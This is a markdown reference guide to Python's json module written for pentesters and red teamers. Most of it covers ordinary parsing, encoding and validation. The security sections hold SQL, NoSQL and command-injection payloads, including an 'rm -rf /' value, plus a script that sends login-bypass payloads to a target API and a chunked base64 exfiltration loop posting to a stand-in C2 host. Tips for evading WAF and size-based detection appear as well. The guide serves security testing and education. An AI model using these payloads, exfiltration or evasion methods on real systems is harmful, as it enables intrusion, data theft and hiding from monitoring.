
# json – Pentester & Red Team Reference (Complete Guide)

## 1. Overview
- `json` is Python's built-in module for **encoding and decoding JSON** (JavaScript Object Notation).
- JSON is the dominant data interchange format for web APIs, cloud services, server-to-server comms, logs, and many NoSQL databases (e.g., MongoDB).

**Why this matters for Pentesters / Red Teamers**
- Most modern web apps and APIs accept and return JSON — understanding JSON handling is essential for recon, exploitation, and persistence.
- JSON is often the vector for injection (SQL/NoSQL/Command), authentication bypasses, insecure deserialization patterns, data exfiltration, and covert channels.
- Knowing performance/streaming tools and validation techniques helps with large-scale data harvests and stealthy C2 channels.

---

## 2. Installation
- `json` is part of Python's standard library; **no install required**.
- Recommended complementary libraries (install as needed):
  - `pip install jsonschema` (validation)
  - `pip install orjson` (fast serializer/deserializer)
  - `pip install simplejson` (compat & some extra options)
  - `pip install ijson` (streaming parser)
  - `pip install python-jose` or `pip install PyJWT` (JWTs handling)

---

## 3. Core Functions & Parameters (what to know)
| Function | Purpose |
|---|---|
| `json.loads(s)` | Parse JSON string → Python object |
| `json.load(fp)` | Parse JSON from file-like object |
| `json.dumps(obj)` | Serialize Python object → JSON string |
| `json.dump(obj, fp)` | Serialize and write JSON to file-like object |
| `json.JSONEncoder` | Base class to implement custom serialization |
| `json.JSONDecoder` | Base class / options for custom decoding |
| `object_hook` | `loads` / `load` parameter to transform decoded dicts |
| `parse_float`, `parse_int`, `parse_constant` | Control how numbers/constants are parsed |
| `ensure_ascii` | Whether to escape non-ASCII characters |
| `indent`, `separators`, `sort_keys` | Formatting options for readable/compact output |

**Useful parameters detailed**:
- `json.loads(s, object_hook=fn)` — `object_hook` receives dicts; return transformed object (useful for structured parsing or normalization).
- `json.dumps(obj, ensure_ascii=False, indent=2)` — produce readable UTF-8 JSON.
- `json.loads(..., parse_float=Decimal)` — preserve precision by parsing floats as `Decimal`.
- `default` (in `JSONEncoder`) — called for objects not serializable by default (e.g., `datetime`, `bytes`).

---

## 4. Practical Examples & Patterns

### 4.1 Basic parsing and serialization
```python
import json

s = '{"user": "alice", "id": 100}'
obj = json.loads(s)
print(obj['user'])  # alice

js = json.dumps(obj)
print(js)  # {"user": "alice", "id": 100}
```

### 4.2 File-based operations (safe write pattern)
```python
import json, os, tempfile

data = {"key": "value"}
# Atomic write: write to temp file then replace
fd, path = tempfile.mkstemp(text=True)
with os.fdopen(fd, "w", encoding="utf-8") as f:
    json.dump(data, f, indent=2)
os.replace(path, "/tmp/config.json")
```

### 4.3 Custom encoder for non-serializable objects
```python
import json, datetime

class MyEncoder(json.JSONEncoder):
    def default(self, obj):
        if isinstance(obj, datetime.datetime):
            return obj.isoformat()
        return super().default(obj)

json.dumps({"t": datetime.datetime.utcnow()}, cls=MyEncoder)
```

### 4.4 Using `object_hook` to normalize incoming JSON
```python
import json

def normalize(d):
    # Convert single-item lists to value, lowercase keys, etc.
    new = {k.lower(): v for k, v in d.items()}
    return new

payload = json.loads('{"User": "Admin"}', object_hook=normalize)
print(payload)  # {'user': 'Admin'}
```

### 4.5 Streaming parse for huge JSON (ijson)
```python
# ijson yields events and allows iterating arrays without loading whole doc
import ijson
with open("huge.json", "rb") as f:
    for item in ijson.items(f, "rows.item"):
        process(item)
```

### 4.6 Newline-delimited JSON (NDJSON / JSON Lines)
```python
# Write NDJSON
with open("out.ndjson", "w", encoding="utf-8") as f:
    for obj in objs:
        f.write(json.dumps(obj) + "\n")

# Read NDJSON
with open("out.ndjson", "r", encoding="utf-8") as f:
    for line in f:
        obj = json.loads(line)
        handle(obj)
```

---

## 5. Security Considerations & Offensive Techniques

### 5.1 Injection vectors via JSON
- **SQL Injection**: When JSON values are embedded into SQL **without** proper parameterization. Example payload injection points:
  - `{"username": "admin' OR '1'='1", "password": "x"}`
- **Command Injection**: If server constructs shell commands from JSON fields.
  - `{"cmd": " || rm -rf / #"}`
- **NoSQL Injection (MongoDB / CouchDB)**: Many NoSQL servers accept JSON-like objects directly; malicious operators can alter queries.
  - Example bypass: `{"username": {"$ne": null}, "password": {"$ne": null}}`
  - Example OR bypass: `{"$or":[{"username":"admin"},{"isAdmin":true}]}`
- **Prototype Pollution (on JS backends)**: While prototype pollution is a JS concern, malformed JSON that sets `__proto__` keys could lead to unexpected behavior in JS-based services that later are used by Python components.

**Pentester actions**:
- Test injection points where app accepts JSON input (API endpoints, AJAX handlers, mobile backends).
- Fuzz keys and values (long strings, binary, control chars) and watch for errors/responses and stack traces.

### 5.2 Deserialization risks & safe handling
- Python's `json` is safe compared to `pickle` (it won't execute code). However, **unsafe use of `object_hook`** or custom decoders that instantiate classes or call functions can introduce code execution if fed malicious JSON.
- **Never** `eval()` or `ast.literal_eval` on untrusted JSON-like strings (use `json.loads`).
- Validate JSON schemas before trusting content.

### 5.3 Large payload & DoS concerns
- Attackers can send huge JSON with deeply nested structures causing memory exhaustion or high CPU parsing cost.
- Test for vulnerabilities like **Billion Laughs** (XML-specific) — but JSON equivalents include extremely deep nesting or massive arrays to exhaust memory/CPU.
- Defensive measures: size limits, depth limits, streaming parsing (ijson), rate-limiting.

### 5.4 JSON in Logging & Exfiltration
- JSON logs often contain sensitive data (tokens, PII). Harvesting endpoints that return verbose JSON can give rich intel.
- **Covert channels**: Use innocuous-looking JSON fields to exfiltrate base64-encoded blobs, or use many small JSON requests to split data and avoid detection.

### 5.5 Handling Control Characters & Unicode
- `json.loads()` will accept Unicode escapes; be mindful of normalization `NFC/NFD`. Use `ensure_ascii=False` when writing to keep UTF-8 human-readable.
- Watch for Unicode homoglyphs in JSON keys/values during phishing or user impersonation testing.

### 5.6 JWTs & JSON
- JWT payloads are JSON. Inspect and create tokens using base64url + `json.loads()` for the payload (after base64url decode).
- Test for weak signing algorithms (`alg: none`) and misuse in server JWT libraries.

---

## 6. Offensive Examples (Practical)

### 6.1 Testing API endpoints for SQL/NoSQL injection
```python
import requests, json

url = "https://api.target.com/login"
payloads = [
    {"username": "admin' -- ", "password": "x"},
    {"username": {"$ne": None}, "password": {"$ne": None}}  # NoSQL attempt
]

for p in payloads:
    r = requests.post(url, json=p)
    print(r.status_code, r.text[:200])
```

### 6.2 Exfil via NDJSON in small chunks (stealth)
```python
import json, requests, base64

data = b"secret-data-to-send"
chunks = [data[i:i+50] for i in range(0, len(data), 50)]

for c in chunks:
    payload = {"id": "abc", "chunk": base64.b64encode(c).decode()}
    requests.post("https://c2.example.com/ingest", json=payload)
```

### 6.3 Detecting and exploiting lenient parsers
- Servers that accept both `application/json` and `text/plain` may apply different parsing logic. Try both content-types.
- Servers that accept trailing commas, comments, or single quotes are using lenient parsers (not strict `json`) — these can be abused with crafted payloads.

---

## 7. Defensive & Detection Notes (helpful for red teamers to evade detection)
- Use compression (gzip) to reduce request size; many WAFs inspect uncompressed bodies less effectively.
- Vary content-types and encoding to bypass simple filters (`application/json; charset=utf-8`, `text/json`).
- Break large exfil payloads across many small JSON posts to avoid size-based detection.
- Use common field names (e.g., `metadata`, `info`) to hide malicious content in noise.

---

## 8. Performance & Libraries (when you need speed or features)
- **orjson**: Extremely fast, supports optional options like `OPT_NAIVE_UTC`. Returns bytes. (`pip install orjson`)
- **ujson / simplejson**: Faster than stdlib in some cases. `simplejson` supports Decimal and extra options.
- **ijson**: Event-based streaming parser for huge JSON files/streams.
- Choose based on needs: speed (orjson), compatibility (simplejson), streaming (ijson).

---

## 9. Validation & Schema
- Use `jsonschema` to validate expected shapes before trusting data.
```python
from jsonschema import validate, ValidationError
schema = {"type": "object", "properties": {"user": {"type": "string"}}}
try:
    validate(instance={"user": "alice"}, schema=schema)
except ValidationError as e:
    print("Invalid JSON:", e)
```

**Pentester tip**: Attempt to bypass schema by sending additional unexpected keys (`__proto__`, `$where`, etc.) to see how server handles them.

---

## 10. Useful Utilities & Commands
- `jq` (CLI JSON processor) — invaluable for quick parsing and filtering.
- `python -m json.tool` — pretty-print JSON in terminal.
- `ndjson` tools for handling newline-delimited JSON.

---

## 11. Checklist (so nothing is missed)
- [x] Basic parse/serialize (`loads`, `dumps`, `load`, `dump`)
- [x] File & atomic write patterns
- [x] Custom encoders / decoders (`JSONEncoder`, `object_hook`)
- [x] Streaming parsing (ijson)
- [x] NDJSON handling
- [x] Injection vectors (SQL/NoSQL/Command)
- [x] Deserialization risks & limitations
- [x] Large payload / DoS concerns
- [x] Unicode, control chars, normalization
- [x] JWT considerations
- [x] Performance alternatives (orjson, simplejson, ijson)
- [x] Schema validation (`jsonschema`)
- [x] Defensive evasion techniques and exfiltration examples

---

## 12. References & Further Reading
- Python `json` docs: https://docs.python.org/3/library/json.html
- jsonschema: https://python-jsonschema.readthedocs.io/
- orjson: https://github.com/ijl/orjson
- ijson: https://pypi.org/project/ijson/
- OWASP: API Security Project — JSON injection and API testing tips
